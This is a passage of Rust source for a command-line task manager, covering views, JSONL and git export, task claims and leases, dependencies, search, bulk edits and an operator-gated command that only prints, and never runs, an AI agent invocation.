            // view used to let done/dismissed rows crowd out open ones.
            let status = (status != "all").then_some(status.as_str());
            let rows = tasks::list_with_filter(db, Some(&expr), status, None, limit)?;
            if json_mode() {
                crate::print_json(&rows)?;
                return Ok(());
            }
            print_lines(ui::headline(
                &format!("ptask · view {}", v.name),
                None,
                &format!("filter {:?}", v.filter_dsl),
            ));
            if rows.is_empty() {
                println!("{}", ui::empty("no tasks match"));
                return Ok(());
            }
            print_lines(ui::task_table(&rows, false, true, false));
            println!("{}", ui::footer(rows.len(), "task", ""));
            Ok(())
        }
        ViewCommand::Rm { name } => {
            let removed = views::delete(db, &name).map_err(anyhow::Error::msg)?;
            emit(
                &serde_json::json!({ "name": name, "removed": removed }),
                || {
                    if removed {
                        println!(
                            "{}",
                            ui::outcome(ui::Status::Bad, "removed", &name, "", "view")
                        );
                    } else {
                        println!("{}", ui::empty(&format!("no view named {name:?}")));
                    }
                },
            )
        }
    }
}

/// `pt mcp` — the agent-native tool surface over stdio. Actor comes from
/// `$PTASK_MCP_ACTOR`, else `$PTASK_ACTOR` (config), default "mcp" (not the
/// CLI's "shell"), source=mcp.
fn cmd_mcp(db: Db) -> Result<()> {
    let config = ptask_core::Config::from_env();
    let rt = tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()
        .context("building tokio runtime")?;
    rt.block_on(ptask_server::mcp::serve_stdio(
        db,
        config.mcp_actor,
        ptask_server::mcp::McpNotify {
            cfg: config.notify,
            dash_url: config.dash.url,
            tg_buttons: config.tg_approval_buttons,
        },
    ))
}

fn cmd_digest(db: &Db, a: DigestArgs) -> Result<()> {
    let v = ptask_core::digest::build(db, a.days)?;
    crate::print_json(&v)?;
    Ok(())
}

/// JSONL export: tasks + task_links + task_labels, one file each. With
/// --git the export dir becomes/updates a repo — a greppable, diffable,
/// mirrorable projection of the spine (the DB stays canonical).
fn cmd_export(db: &Db, a: ExportArgs) -> Result<()> {
    let out = a.out.unwrap_or_else(|| {
        ptask_core::config::home_dir()
            .join("puretensor-tasks")
            .join("export")
    });
    std::fs::create_dir_all(&out).with_context(|| format!("mkdir {:?}", out))?;
    let conn = db.get()?;
    let dump = |sql: &str, cols: &[&str], file: &str| -> Result<usize> {
        let mut stmt = conn.prepare(sql)?;
        let n_cols = cols.len();
        let mut rows = stmt.query([])?;
        let mut lines = Vec::new();
        while let Some(r) = rows.next()? {
            let mut m = serde_json::Map::new();
            for (i, c) in cols.iter().enumerate().take(n_cols) {
                let v: ptask_core::rusqlite::types::Value = r.get(i)?;
                m.insert(
                    (*c).to_string(),
                    match v {
                        ptask_core::rusqlite::types::Value::Null => serde_json::Value::Null,
                        ptask_core::rusqlite::types::Value::Integer(n) => serde_json::json!(n),
                        ptask_core::rusqlite::types::Value::Real(f) => serde_json::json!(f),
                        ptask_core::rusqlite::types::Value::Text(t) => serde_json::json!(t),
                        ptask_core::rusqlite::types::Value::Blob(_) => serde_json::Value::Null,
                    },
                );
            }
            // Terminal-safe like every JSON printer: `cat` on an export
            // must not replay escape or bidi characters.
            lines.push(
                ptask_core::text::json_terminal_safe(&serde_json::to_string(&m)?).into_owned(),
            );
        }
        std::fs::write(out.join(file), lines.join("\n") + "\n")?;
        Ok(lines.len())
    };
    let nt = dump(
        "SELECT id, pt_id, title, description, priority, status_v2, created_at,
                updated_at, deadline, due_at, snoozed_until, source_type, task_type,
                project, parent_uuid, priority_score, escalation_level
         FROM tasks ORDER BY rowid",
        &[
            "id",
            "pt_id",
            "title",
            "description",
            "priority",
            "status",
            "created_at",
            "updated_at",
            "deadline",
            "due_at",
            "snoozed_until",
            "source_type",
            "task_type",
            "project",
            "parent_uuid",
            "priority_score",
            "escalation_level",
        ],
        "tasks.jsonl",
    )?;
    let nl = dump(
        "SELECT from_uuid, to_uuid, kind, created_at FROM task_links ORDER BY rowid",
        &["from_uuid", "to_uuid", "kind", "created_at"],
        "task_links.jsonl",
    )?;
    let nb = dump(
        "SELECT task_uuid, label FROM task_labels ORDER BY rowid",
        &["task_uuid", "label"],
        "task_labels.jsonl",
    )?;
    // Notes and closure evidence (journal events carrying a note), so the
    // diffable projection keeps the why of each close, not only its status.
    let nn = dump(
        "SELECT id, task_uuid, ts, actor, json_extract(payload, '$.source'),
                event_type, json_extract(payload, '$.note')
         FROM pt_event_log
         WHERE task_uuid IS NOT NULL
           AND task_uuid IN (SELECT id FROM tasks)
           AND event_type IN ('task.noted', 'task.completed',
                              'task.recurrence_advanced', 'task.updated')
           AND json_valid(payload) AND json_type(payload, '$.note') = 'text'
         ORDER BY id",
        &[
            "id",
            "task_uuid",
            "ts",
            "actor",
            "source",
            "event_type",
            "note",
        ],
        "task_notes.jsonl",
    )?;
    println!(
        "{}",
        ui::section(
            "exported",
            ui::Ink::Green,
            &format!(
                "{nt} tasks · {nl} links · {nb} labels · {nn} notes → {}",
                out.display()
            )
        )
    );
    if a.git {
        if !out.join(".git").exists() {
            run_git_checked(&out, &["init", "-q"])?;
        }
        run_git_checked(&out, &["add", "-A"])?;
        let msg = format!(
            "pt export: {} tasks, {} links, {} labels, {} notes",
            nt, nl, nb, nn
        );
        if git_has_staged_changes(&out)? {
            run_git_checked(&out, &["commit", "-q", "-m", &msg])?;
            println!("{}", ui::note(&format!("committed: {msg}")));
        } else {
            println!(
                "{}",
                ui::note("nothing to commit (no changes since last export)")
            );
        }
    }
    Ok(())
}

fn run_git(out: &std::path::Path, args: &[&str]) -> Result<std::process::Output> {
    std::process::Command::new("git")
        .args(args)
        .current_dir(out)
        .output()
        .with_context(|| format!("running git {}", args.join(" ")))
}

fn run_git_checked(out: &std::path::Path, args: &[&str]) -> Result<std::process::Output> {
    let output = run_git(out, args)?;
    if output.status.success() {
        return Ok(output);
    }
    let stderr = String::from_utf8_lossy(&output.stderr);
    anyhow::bail!(
        "git {} failed ({}): {}",
        args.first().copied().unwrap_or("command"),
        output.status,
        stderr.trim()
    );
}

fn git_has_staged_changes(out: &std::path::Path) -> Result<bool> {
    let args = ["diff", "--cached", "--quiet", "--exit-code"];
    let output = run_git(out, &args)?;
    match output.status.code() {
        Some(0) => Ok(false),
        Some(1) => Ok(true),
        _ => {
            let stderr = String::from_utf8_lossy(&output.stderr);
            anyhow::bail!("git diff failed ({}): {}", output.status, stderr.trim());
        }
    }
}

fn shell_single_quote(value: &str) -> String {
    format!("'{}'", value.replace('\'', "'\"'\"'"))
}

/// The operator copies this off the screen, so it is built from the
/// sanitised title: a CR/erase or conceal sequence in the title could
/// otherwise make the visible command differ from the copied one.
fn delegation_command(handle: &str, title: &str) -> String {
    let title = ui::one_line(title);
    let prompt = format!(
        "Work the pTask task {handle}: {title}. When done: pt done {handle}; if blocked, pt add the blocker as its own task, then pt depend {handle} --on <its PT-N>."
    );
    format!("claude -p {}", shell_single_quote(&prompt))
}

/// `pt delegate` — OPERATOR-GATED skeleton. Prints the headless command;
/// never spawns it. Autonomy is revisited once the loop is proven.
fn cmd_delegate(db: &Db, a: DelegateArgs) -> Result<()> {
    let t = tasks::resolve_for_lookup(db, &a.id, false).map_err(anyhow::Error::msg)?;
    let handle = t.pt_id.clone().unwrap_or_else(|| t.id.clone());
    let command = delegation_command(&handle, &t.title);
    let out = serde_json::json!({ "pt_id": t.pt_id, "task_uuid": t.id, "command": command });
    emit(&out, || {
        print_lines(ui::headline(
            &format!("ptask · delegate {handle}"),
            Some(("operator-gated", ui::Ink::Amber)),
            "review, then run it yourself",
        ));
        println!("  {}", ui::paint(&command, ui::Ink::Paper));
        println!();
        println!(
            "{}",
            ui::note("operator-gated by design — pt will not spawn agents autonomously")
        );
    })
}

fn cmd_serve(db: Db, a: ServeArgs) -> Result<()> {
    let addr = match a.bind.as_deref() {
        Some(s) => s
            .parse()
            .with_context(|| format!("parsing --bind {:?}", s))?,
        None => ptask_server::default_bind(),
    };
    // The one env read for this process — everything downstream is injected.
    let config = ptask_core::Config::from_env();
    let rt = tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()
        .context("building tokio runtime")?;
    rt.block_on(ptask_server::serve(db, addr, config))
}

fn cmd_bot(db: Db) -> Result<()> {
    let rt = tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()
        .context("building tokio runtime")?;
    rt.block_on(ptask_bot::run(db))
}

fn cmd_branch(db: &Db, a: BranchArgs) -> Result<()> {
    let task = tasks::resolve(db, &a.query).map_err(anyhow::Error::msg)?;
    let pt = task.pt_id.clone().unwrap_or_else(|| "PT-?".into());
    println!("{}", tasks::branch_name(&pt, &task.title));
    Ok(())
}

fn cmd_accountability(db: Db, c: AccountabilityCommand) -> Result<()> {
    match c {
        AccountabilityCommand::Run(a) => {
            let ptask_core::Config {
                notify: mut cfg,
                dash,
                tg_approval_buttons,
                ..
            } = ptask_core::Config::from_env();
            if a.dry_run {
                cfg.dry_run = true;
            }
            // Validate From/To/CC before anything is sent. A bad address used
            // to surface mid-run, after Telegram had delivered but before the
            // reminder was stamped, so every later run repeated the nudge.
            // Email is switched off for this run (the ladder falls back to
            // Telegram) and the unit fails at the end, after stamping.
            let email_misconfigured = ptask_notify::validate_email_cfg(&cfg).err();
            if let Some(err) = &email_misconfigured {
                eprintln!(
                    "{}",
                    ui::section(
                        "email misconfigured",
                        ui::Ink::Red,
                        &format!("{err} — email disabled for this run")
                    )
                );
                cfg.smtp_host = None;
            }
            let rt = tokio::runtime::Builder::new_multi_thread()
                .enable_all()
                .build()
                .context("building tokio runtime")?;
            let report = rt.block_on(async {
                // The 15-minute timer is the approval inbox's sweeper too:
                // expire stale requests first so they are never pinged.
                if !cfg.dry_run {
                    let ctx = ptask_core::event_log::EventCtx::system("approvals");
                    if let Err(e) = ptask_core::approvals::expire(&db, &ctx) {
                        eprintln!(
                            "{}",
                            ui::section(
                                "warning",
                                ui::Ink::Amber,
                                &format!("approval expiry sweep: {e}")
                            )
                        );
                    }
                }
                // Same cfg as the ladder, so --dry-run covers the pings.
                let _ = ptask_notify::notify_pending(
                    &db,
                    &cfg,
                    dash.url.as_deref(),
                    tg_approval_buttons,
                )
                .await;
                ptask_core::accountability::run_check(&db, &cfg, &ptask_notify::HttpDispatch).await
            })?;
            if report.quiet_hours {
                println!(
                    "{}",
                    ui::section("quiet hours", ui::Ink::Slate, "no dispatch")
                );
                return accountability_verdict(&report, email_misconfigured.as_deref());
            }
            let tg = report.dispatched.iter().filter(|d| d.telegram_sent).count();
            let em = report.dispatched.iter().filter(|d| d.email_sent).count();
            // All-channels-dead is a hard failure: the 2026-05→06 incidents
            // (dead Gemini key, 401ing bot token) both hid behind an exit-0
            // "ok" line for weeks. Print the report, then fail the unit.
            let all_dead =
                report.eligible > 0 && report.dispatched.is_empty() && report.send_failures > 0;
            println!(
                "{}",
                ui::section(
                    if all_dead {
                        "accountability failed"
                    } else {
                        "accountability ok"
                    },
                    if all_dead {
                        ui::Ink::Red
                    } else {
                        ui::Ink::Green
                    },
                    &format!(
                        "eligible {} · dispatched {} · telegram {} · email {} · failures {} · budget {}/{}",
                        report.eligible,
                        report.dispatched.len(),
                        tg,
                        em,
                        report.send_failures,
                        report.budget_used_after,
                        ptask_core::accountability::DAILY_BUDGET_MAX,
                    )
                )
            );
            for d in &report.dispatched {
                println!(
                    "{}",
                    ui::bullet(
                        &d.task_uuid,
                        format!(
                            "level {} · telegram {} · email {}{}",
                            d.level,
                            d.telegram_sent,
                            d.email_sent,
                            d.error
                                .as_deref()
                                .map(|e| format!(" · error: {e}"))
                                .unwrap_or_default()
                        ),
                        ui::Ink::Cyan,
                        36
                    )
                );
            }
            accountability_verdict(&report, email_misconfigured.as_deref())
        }
    }
}

/// Exit status of `pt accountability run`, decided after the report has
/// been printed (and every delivered nudge stamped).
fn accountability_verdict(
    report: &ptask_core::accountability::RunReport,
    email_misconfigured: Option<&str>,
) -> Result<()> {
    // Misconfiguration first: quiet hours only mean nothing was sent, not
    // that the setup is fine, and returning early hid a bad address for ten
    // hours a day.
    if let Some(err) = email_misconfigured {
        anyhow::bail!("accountability email misconfigured: {err}");
    }
    if report.quiet_hours {
        return Ok(());
    }
    // All-channels-dead is a hard failure: the 2026-05→06 incidents (dead
    // Gemini key, 401ing bot token) both hid behind an exit-0 "ok" line.
    if report.eligible > 0 && report.dispatched.is_empty() && report.send_failures > 0 {
        anyhow::bail!(
            "accountability dispatch dead — {} eligible, 0 dispatched, {} send failures",
            report.eligible,
            report.send_failures
        );
    }
    Ok(())
}

fn cmd_start(db: &Db, a: StartArgs) -> Result<()> {
    let task = tasks::resolve(db, &a.query).map_err(anyhow::Error::msg)?;
    let claim_token = tasks::start(db, &task.id, &cli_ctx())?;
    let mut v =
        serde_json::json!({"pt_id": task.pt_id, "task_uuid": task.id, "status": "in_progress"});
    if let Some(t) = &claim_token {
        v["claim_token"] = serde_json::json!(t);
    }
    emit(&v, || {
        println!(
            "{}",
            ui::outcome(
                ui::Status::Busy,
                "started",
                task.pt_id.as_deref().unwrap_or(""),
                &task.title,
                "in progress"
            )
        )
    })
}

/// "in 12m" / "5m ago" for a lease end, against now.
fn lease_phrase(expires_at: Option<&str>) -> String {
    let Some(end) = expires_at.and_then(ptask_core::dates::parse_iso_to_utc) else {
        return "no lease".into();
    };
    let secs = end.timestamp().as_second() - ptask_core::jiff::Timestamp::now().as_second();
    let mins = (secs.abs() + 59) / 60;
    let span = if mins >= 120 {
        format!("{}h", mins / 60)
    } else {
        format!("{mins}m")
    };
    if secs > 0 {
        format!("lease ends in {span}")
    } else {
        format!("lease expired {span} ago")
    }
}

fn cmd_claim(db: &Db, a: ClaimArgs) -> Result<()> {
    let lease = a
        .lease
        .as_deref()
        .map(ptask_core::claims::parse_lease)
        .transpose()
        .map_err(anyhow::Error::msg)?;
    let task = tasks::resolve_for_lookup(db, &a.query, false).map_err(anyhow::Error::msg)?;
    let claim =
        ptask_core::claims::claim(db, &task.id, lease, &cli_ctx()).map_err(anyhow::Error::msg)?;
    let v = serde_json::json!({
        "pt_id": task.pt_id, "task_uuid": task.id, "status": "in_progress",
        "claim": claim,
        "claim_token": claim.token,
    });
    emit(&v, || {
        println!(
            "{}",
            ui::outcome(
                ui::Status::Busy,
                "claimed",
                task.pt_id.as_deref().unwrap_or(""),
                &task.title,
                &format!(
                    "by {} · {}",
                    claim.by,
                    lease_phrase(claim.expires_at.as_deref())
                )
            )
        )
    })
}

fn cmd_heartbeat(db: &Db, a: HeartbeatArgs) -> Result<()> {
    let lease = ptask_core::claims::parse_lease(&a.lease).map_err(anyhow::Error::msg)?;
    let task = tasks::resolve_for_lookup(db, &a.query, true).map_err(anyhow::Error::msg)?;
    let claim = ptask_core::claims::heartbeat(db, &task.id, lease, &a.claim, &cli_ctx())
        .map_err(anyhow::Error::msg)?;
    emit(
        &serde_json::json!({"pt_id": task.pt_id, "task_uuid": task.id, "claim": claim}),
        || {
            println!(
                "{}",
                ui::outcome(
                    ui::Status::Ok,
                    "renewed",
                    task.pt_id.as_deref().unwrap_or(""),
                    &task.title,
                    &lease_phrase(claim.expires_at.as_deref())
                )
            )
        },
    )
}

fn cmd_release(db: &Db, a: ReleaseArgs) -> Result<()> {
    let task = tasks::resolve_for_lookup(db, &a.query, false).map_err(anyhow::Error::msg)?;
    let r = ptask_core::claims::release(
        db,
        &task.id,
        a.force,
        a.reason.as_deref(),
        a.claim.as_deref(),
        &cli_ctx(),
    )
    .map_err(anyhow::Error::msg)?;
    emit(
        &serde_json::json!({
            "pt_id": task.pt_id, "task_uuid": task.id, "status": "todo",
            "released": r,
        }),
        || {
            let detail = match (&r.holder, r.forced) {
                (Some(h), true) => format!("→ todo · {h}'s claim released (forced)"),
                (Some(_), false) => "→ todo · claim released".to_string(),
                (None, _) => "→ todo".to_string(),
            };
            println!(
                "{}",
                ui::outcome(
                    ui::Status::Changed,
                    "released",
                    task.pt_id.as_deref().unwrap_or(""),
                    &task.title,
                    &detail
                )
            )
        },
    )
}

fn cmd_reclaim(db: &Db, a: ReclaimArgs) -> Result<()> {
    let report = ptask_core::claims::reclaim_expired(
        db,
        !a.apply,
        &ptask_core::event_log::EventCtx::system("reclaim"),
    )?;
    print_reclaim(&report)
}

fn print_reclaim(report: &ptask_core::claims::ReclaimReport) -> Result<()> {
    if json_mode() {
        return crate::print_json(report);
    }
    if report.reclaimed.is_empty() {
        println!(
            "{}",
            ui::section("reclaim ok", ui::Ink::Green, "no expired claims")
        );
        return Ok(());
    }
    let (status, verb) = if report.dry_run {
        (ui::Status::Warn, "expired")
    } else {
        (ui::Status::Changed, "reclaimed")
    };
    for c in &report.reclaimed {
        println!(
            "{}",
            ui::outcome(
                status,
                verb,
                c.pt_id.as_deref().unwrap_or(&c.task_uuid),
                &c.title,
                &format!(
                    "held by {} · {}",
                    c.holder,
                    lease_phrase(Some(&c.expired_at))
                )
            )
        );
    }
    if report.dry_run {
        println!(
            "{}",
            ui::note("dry run — `pt reclaim --apply` returns them to todo")
        );
    }
    Ok(())
}

fn cmd_promote(db: &Db, a: StartArgs) -> Result<()> {
    let task = tasks::resolve(db, &a.query).map_err(anyhow::Error::msg)?;
    tasks::promote(db, &task.id, &cli_ctx())?;
    emit(
        &serde_json::json!({
            "pt_id": task.pt_id, "task_uuid": task.id,
            "kind": "ship", "deliverable": "pr"
        }),
        || {
            println!(
                "{}",
                ui::outcome(
                    ui::Status::Changed,
                    "promoted",
                    task.pt_id.as_deref().unwrap_or(""),
                    &task.title,
                    "scout → ship (same row)"
                )
            )
        },
    )
}

fn cmd_kind(db: &Db, a: KindArgs) -> Result<()> {
    let task = tasks::resolve(db, &a.query).map_err(anyhow::Error::msg)?;
    let kind: tasks::TaskKind = a.kind.parse().map_err(anyhow::Error::msg)?;
    if let Some(d) = a.deliverable.as_deref() {
        tasks::validate_deliverable(d).map_err(anyhow::Error::msg)?;
    }
    tasks::set_kind(db, &task.id, kind, a.deliverable.as_deref(), &cli_ctx())?;
    emit(
        &serde_json::json!({
            "pt_id": task.pt_id, "task_uuid": task.id,
            "kind": kind.as_str(), "deliverable": a.deliverable
        }),
        || {
            println!(
                "{}",
                ui::outcome(
                    ui::Status::Changed,
                    "kind",
                    task.pt_id.as_deref().unwrap_or(""),
                    &task.title,
                    &match a.deliverable.as_deref() {
                        Some(d) => format!("{} → {d}", kind.as_str()),
                        None => kind.as_str().to_string(),
                    }
                )
            )
        },
    )
}

fn cmd_snooze(db: &Db, a: SnoozeArgs) -> Result<()> {
    let phrase = a.until.join(" ");
    if phrase.trim().is_empty() {
        anyhow::bail!("snooze needs a wake time, e.g. `pt snooze PT-42 next monday`");
    }
    let until = ptask_core::dates::parse(&phrase).map_err(anyhow::Error::msg)?;
    let until_iso = ptask_core::dates::format_iso(&until);
    let task = tasks::resolve(db, &a.query).map_err(anyhow::Error::msg)?;
    tasks::snooze(db, &task.id, &until_iso, &cli_ctx())?;
    emit(
        &serde_json::json!({
            "pt_id": task.pt_id, "task_uuid": task.id,
            "status": "snoozed", "snoozed_until": until_iso
        }),
        || {
            println!(
                "{}",
                ui::outcome(
                    ui::Status::Mute,
                    "snoozed",
                    task.pt_id.as_deref().unwrap_or(""),
                    &task.title,
                    &format!("until {until_iso}")
                )
            )
        },
    )
}

fn cmd_depend(db: &Db, a: DependArgs) -> Result<()> {
    let Some(on) = a.on.as_deref() else {
        // No --on: show current edges.
        let task = tasks::resolve_for_lookup(db, &a.query, true).map_err(anyhow::Error::msg)?;
        let detail = tasks::load_detail(db, &task.id)?;
        return emit(&detail, || {
            println!(
                "{}",
                ui::outcome(
                    ui::Status::Mute,
                    "edges",
                    task.pt_id.as_deref().unwrap_or(""),
                    &task.title,
                    ""
                )
            );
            let fmt = |v: &[String]| {
                if v.is_empty() {
                    "--".to_string()
                } else {
                    v.join(", ")
                }
            };
            print_lines(ui::kv(
                &[
                    ("depends on", fmt(&detail.depends_on).into()),
                    ("blocks", fmt(&detail.blocks_tasks).into()),
                ],
                14,
            ))
        });
    };
    let from = tasks::resolve_for_lookup(db, &a.query, true).map_err(anyhow::Error::msg)?;
    let to = tasks::resolve_for_lookup(db, on, true).map_err(anyhow::Error::msg)?;
    if a.clear {
        tasks::remove_dependency(db, &from.id, &to.id, &cli_ctx())?;
    } else {
        tasks::add_dependency(db, &from.id, &to.id, &cli_ctx())?;
    }
    emit(
        &serde_json::json!({
            "from": from.pt_id, "on": to.pt_id,
            "action": if a.clear { "removed" } else { "added" }
        }),
        || {
            println!(
                "{}",
                ui::outcome(
                    if a.clear {
                        ui::Status::Mute
                    } else {
                        ui::Status::Changed
                    },
                    if a.clear { "cleared" } else { "depends" },
                    from.pt_id.as_deref().unwrap_or_else(|| short_id(&from.id)),
                    &format!(
                        "→ {}  {}",
                        to.pt_id.as_deref().unwrap_or_else(|| short_id(&to.id)),
                        to.title
                    ),
                    if a.clear { "dependency removed" } else { "" }
                )
            )
        },
    )
}

fn cmd_why(db: &Db, a: WhyArgs) -> Result<()> {
    let task = tasks::resolve_for_lookup(db, &a.query, false).map_err(anyhow::Error::msg)?;
    let b = ptask_core::scoring::why(db, &task.id)?;
    emit(&b, || {
        print_lines(ui::headline(
            &format!("ptask · why {}", b.pt_id.as_deref().unwrap_or("-")),
            Some((&format!("rank {}/{}", b.rank, b.of), ui::Ink::Cyan)),
            &format!("composite {:.3}", b.composite),
        ));
        for l in ui::wrap(&b.title, ui::term_width().saturating_sub(4), "") {
            println!("  {}", ui::bold(&l, ui::Ink::Paper));
        }
        println!();
        let (wu, wd, wn, wm) = b.weights;
        let term = |v: f64, w: f64, why: &str| {
            format!(
                "{} {} {}",
                ui::paint(&format!("{v:.3}"), ui::Ink::Paper),
                ui::paint(&format!("× {w:.2}"), ui::Ink::Steel),
                ui::dim(why, ui::Ink::Slate)
            )
        };
        print_lines(ui::kv(
            &[
                ("urgency", ui::painted(term(b.urgency, wu, ""))),
                (
                    "dependency",
                    ui::painted(term(b.dependency, wd, "active tasks blocked by this")),
                ),
                (
                    "neglect",
                    ui::painted(term(b.neglect, wn, "time since last touch / 30d")),
                ),
                ("manual", ui::painted(term(b.manual, wm, "priority"))),
                (
                    "effort",
                    ui::painted(format!(
                        "{}  {}",
                        ui::paint(&format!("×{:.3}", b.effort_factor), ui::Ink::Paper),
                        ui::dim(&format!("llm nudge {:+.3}", b.score_llm), ui::Ink::Slate)
                    )),
                ),
            ],
            14,
        ));
    })
}

fn cmd_search(db: &Db, a: SearchArgs) -> Result<()> {
    let q = a.query.join(" ");
    if q.trim().is_empty() {
        anyhow::bail!("search needs a query");
    }
    let mut rows: Vec<serde_json::Value> = Vec::new();
    if let Some(fts) = tasks::fts_match_query(&q) {
        let conn = db.get()?;
        let mut stmt = conn.prepare(
            "SELECT t.id, t.pt_id, t.title, t.status_v2, t.priority
             FROM tasks_fts f JOIN tasks t ON t.rowid = f.rowid
             WHERE tasks_fts MATCH ?1
             ORDER BY rank LIMIT ?2",
        )?;
        rows = stmt
            .query_map((&fts, a.limit as i64), |r| {
                Ok(serde_json::json!({
                    "task_uuid": r.get::<_, String>(0)?,
                    "pt_id": r.get::<_, Option<String>>(1)?,
                    "title": r.get::<_, String>(2)?,
                    "status": r.get::<_, String>(3)?,
                    "priority": r.get::<_, i64>(4)?,
                }))
            })?
            .collect::<std::result::Result<_, _>>()?;
    }
    emit(&rows, || {
        print_lines(ui::headline(
            "ptask · search",
            None,
            &format!("{q:?} · best match first"),
        ));
        if rows.is_empty() {
            println!("{}", ui::empty("no matches"));
            return;
        }
        let hits: Vec<ptask_core::Task> = rows
            .iter()
            .map(|r| ptask_core::Task {
                id: r["task_uuid"].as_str().unwrap_or("").to_string(),
                pt_id: r["pt_id"].as_str().map(str::to_string),
                title: r["title"].as_str().unwrap_or("").to_string(),
                description: String::new(),
                priority: r["priority"].as_i64().unwrap_or(2),
                status: r["status"].as_str().unwrap_or("").to_string(),
                created_at: String::new(),
                updated_at: String::new(),
                deadline: None,
                source_type: String::new(),
                ai_reasoning: String::new(),
                kind: String::new(),
                deliverable: None,
            })
            .collect();
        print_lines(ui::task_table(&hits, false, false, false));
        println!("{}", ui::footer(hits.len(), "match", ""));
    })
}

fn cmd_bulk(db: &Db, a: BulkArgs) -> Result<()> {
    let expr = ptask_core::filter::parse(&a.filter).map_err(anyhow::Error::msg)?;
    // Validate before the dry run returns: `--set-priority bogus --dry-run`
    // previewed happily and exited 0.
    let level = a
        .set_priority
        .as_deref()
        .map(priority::parse)
        .transpose()
        .map_err(anyhow::Error::msg)?;
    let matches = tasks::list_with_filter(db, Some(&expr), Some("pending"), None, 10_000)
        .map_err(anyhow::Error::msg)?;
    let action = if let Some(prio) = a.set_priority.as_deref() {
        Some(format!("set priority {}", prio))
    } else if a.done {
        Some("mark done".to_string())
    } else if a.dismiss {
        Some("dismiss".to_string())
    } else {
        None
    };
    let report = |failures: &[(String, String)]| {
        serde_json::json!({
            "filter": a.filter,
            "action": action,
            "dry_run": a.dry_run,
            "matched": matches,
            "failures": failures
                .iter()
                .map(|(pt, e)| serde_json::json!({ "task": pt, "error": e }))
                .collect::<Vec<_>>(),
        })
    };
    if matches.is_empty() {
        return emit(&report(&[]), || {
            println!(
                "{}",
                ui::empty(&format!("bulk: no tasks match {:?}", a.filter))
            )
        });
    }
    let Some(action) = action.as_deref() else {
        anyhow::bail!("bulk needs one of --set-priority / --done / --dismiss");
    };
    if !json_mode() {
        print_lines(ui::headline(
            "ptask · bulk",
            Some(if a.dry_run {
                ("dry run", ui::Ink::Amber)
            } else {
                ("apply", ui::Ink::Magenta)
            }),
            &format!("{} match {:?} · action: {action}", matches.len(), a.filter),
        ));
        print_lines(ui::task_table(&matches, false, false, false));
    }
    if a.dry_run {
        return emit(&report(&[]), || {
            println!("{}", ui::note("dry run — nothing applied"))
        });
    }
    // Apply to every match; a failing task (e.g. blocked by another match)
    // is reported and the rest still land, instead of stopping half-done.
    let mut pending: Vec<&ptask_core::Task> = matches.iter().collect();
    let mut failures: Vec<(String, String)> = Vec::new();
    // Two passes for --done: a task blocked by a later match succeeds once
    // its prerequisite has been completed in the first pass.
    for pass in 0..2 {
        let mut retry = Vec::new();
        for t in pending {
            let ctx = task_ctx(&t.id);
            if already_applied(db, &ctx)? {
                continue;
            }
            let applied = if let Some(level) = level {
                tasks::update_priority(db, &t.id, level, &ctx).map(|_| ())
            } else if a.done {
                tasks::mark_done_noted(db, t, a.note.as_deref(), &ctx).map(|outcome| {
                    if let tasks::DoneOutcome::Advanced { next_deadline } = outcome
                        && !json_mode()
                    {
                        println!(
                            "{}",
                            ui::outcome(
                                ui::Status::Changed,
                                "advanced",
                                t.pt_id.as_deref().unwrap_or("-"),
                                &t.title,
                                &format!("next {next_deadline}")
                            )
                        );
                    }
                })
            } else {
                tasks::dismiss_noted(db, &t.id, a.note.as_deref(), &ctx)
            };
            if let Err(e) = applied {
                if pass == 0 && a.done && matches!(e, ptask_core::Error::Blocked(_)) {
                    retry.push(t);
                } else {
                    failures.push((
                        t.pt_id.clone().unwrap_or_else(|| t.id.clone()),
                        e.to_string(),
                    ));
                }
            }
        }
        pending = retry;
    }
    let rescored = ptask_core::scoring::run_once(db, false);
    emit(&report(&failures), || match rescored {
        Ok(r) => println!(
            "{}",
            ui::section(
                "bulk applied",
                ui::Ink::Green,
                &format!("{} task(s) · rescored {}", matches.len(), r.tasks_scored)
            )
        ),
        Err(e) => println!(
            "{}",
            ui::section(
                "bulk applied",
                ui::Ink::Amber,
                &format!("{} task(s) · rescore failed: {e}", matches.len())
            )
        ),
    })?;
    for (pt, e) in &failures {
        eprintln!(
            "{}",
            ui::section("error", ui::Ink::Red, &format!("{pt}: {e}"))
        );
    }
    if !failures.is_empty() {
        anyhow::bail!(
            "{} of {} task(s) not applied",
            failures.len(),
            matches.len()
        );
    }
    Ok(())
}

type ReviewRow = (String, Option<String>, String, String, String);

fn stale_review_tasks(db: &Db, cutoff_iso: &str) -> Result<Vec<ReviewRow>> {
    let conn = db.get()?;
    // An unreadable `updated_at` counts as stale: `julianday()` is NULL on
    // junk, so without the guard the row would never reach review at all.
    let mut stmt = conn.prepare(
        "SELECT t.id, t.pt_id, t.title, t.status_v2, t.updated_at
         FROM tasks t
         WHERE t.status_v2 IN ('triage','backlog','todo','in_progress')
           AND (julianday(t.updated_at) IS NULL
                OR julianday(t.updated_at) < julianday(?1))
         ORDER BY t.updated_at ASC",
    )?;
    Ok(stmt
        .query_map([&cutoff_iso], |r| {
            Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?, r.get(4)?))
        })?
        .collect::<std::result::Result<_, _>>()?)
}

fn cmd_review(db: &Db, a: ReviewArgs) -> Result<()> {
    use std::io::Write;
    // Checked: jiff's infallible Span::days panicked (exit 101) past ±7.3M days.
    let span = ptask_core::jiff::Span::new()
        .try_days(a.stale_days)
        .map_err(|_| anyhow::anyhow!("--stale-days {} is out of range", a.stale_days))?;
    let stale_cutoff = ptask_core::dates::now_in_operator_tz()
        .map_err(anyhow::Error::msg)?
        .checked_sub(span)
        .map_err(|e| anyhow::anyhow!("--stale-days {}: {e}", a.stale_days))?;
    let cutoff_iso = ptask_core::dates::format_iso(&stale_cutoff);
    let stale = stale_review_tasks(db, &cutoff_iso)?;
    if json_mode() {
        // Machine callers get the sweep's list; triage stays interactive.
        let rows: Vec<serde_json::Value> = stale
            .iter()
            .map(|(uuid, pt, title, status, updated)| {
                serde_json::json!({
                    "task_uuid": uuid, "pt_id": pt, "title": title,
                    "status": status, "updated_at": updated,
                })
            })
            .collect();
        crate::print_json(&rows)?;
        return Ok(());
    }

    print_lines(ui::headline(
        "ptask · review",
        Some((
            &format!("{} stale", stale.len()),
            if stale.is_empty() {
                ui::Ink::Green
            } else {
                ui::Ink::Amber
            },
        )),
        &format!("untouched > {}d · oldest first", a.stale_days),
    ));
    if stale.is_empty() {
        println!(
            "{}",
